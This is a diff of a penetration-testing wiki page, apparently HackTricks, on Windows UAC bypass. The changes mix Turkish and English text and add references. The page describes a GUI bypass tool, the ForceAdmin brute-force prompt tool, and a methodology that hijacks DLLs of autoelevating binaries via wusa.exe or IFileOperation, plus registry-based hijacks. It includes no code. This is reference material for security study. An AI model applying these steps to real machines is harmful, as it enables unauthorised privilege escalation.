+Ayrıca, eğer birinin kullandığı (muhtemelen RDP ile) bir GUI session elde ederseniz, bazı araçlar administrator olarak çalışıyor olabilir; bu araçlardan örneğin bir **cmd**'yi doğrudan **as admin** olarak UAC tarafından tekrar sorulmadan çalıştırabilirsiniz, örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.
 
-### Gürültülü brute-force UAC atlatma
+### Gürültülü brute-force UAC bypass
 
-Eğer gürültü yapmaktan rahatsız değilseniz, her zaman **şunu çalıştırabilirsiniz**: [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) bu **kullanıcı kabul edene kadar izinleri yükseltmek için istek yapar**.
+Gürültülü olmaktan endişe etmiyorsanız, kullanıcı kabul edene kadar izinleri yükseltmeyi isteyen [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir aracı çalıştırabilirsiniz.
 
-### Kendi atlatmanız - Temel UAC atlatma metodolojisi
+### Kendi bypass'ınız - Temel UAC bypass metodolojisi
 
-**UACME**'ye bir göz atarsanız, **çoğu UAC atlatmasının bir Dll Hijacking zafiyetini kötüye kullandığını** göreceksiniz (esas olarak kötü amaçlı dll'yi _C:\Windows\System32_ içine yazmak). [Dll Hijacking zafiyetini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).
+If you take a look to **UACME** you will note that **most UAC bypasses abuse a Dll Hijacking vulnerabilit**y (mainly writing the malicious dll on _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).
 
-1. **Otomatik yükseltme** yapacak bir ikili dosya bulun (çalıştırıldığında yüksek bütünlük seviyesinde çalıştığını kontrol edin).
-2. Procmon ile **DLL Hijacking**'e karşı savunmasız olabilecek "**NAME NOT FOUND**" olaylarını bulun.
-3. Muhtemelen bazı **korumalı yollar** (C:\Windows\System32 gibi) içinde DLL'yi **yazmanız** gerekecek, burada yazma izinleriniz yok. Bunu aşmak için:
-   1. **wusa.exe**: Windows 7, 8 ve 8.1. Korumalı yollar içinde bir CAB dosyasının içeriğini çıkarmaya izin verir (çünkü bu araç yüksek bütünlük seviyesinden çalıştırılır).
-   2. **IFileOperation**: Windows 10.
-4. Korumalı yola DLL'nizi kopyalamak ve savunmasız ve otomatik yükseltilmiş ikili dosyayı çalıştırmak için bir **script** hazırlayın.
+1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
+2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
+3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
+1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
+2. **IFileOperation**: Windows 10.
+4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
 
-### Başka bir UAC atlatma tekniği
+### Another UAC bypass technique
 
-Bir **autoElevated binary**'nin **kayıttan** bir **binary** veya **komut**'un **adını/yolunu** **okumaya** çalışıp çalışmadığını izlemeyi içerir (bu, binary bu bilgiyi **HKCU** içinde arıyorsa daha ilginçtir).
+Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
+
+## References
+- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
+- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
+- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
 
 {{#include ../../banners/hacktricks-training.md}}
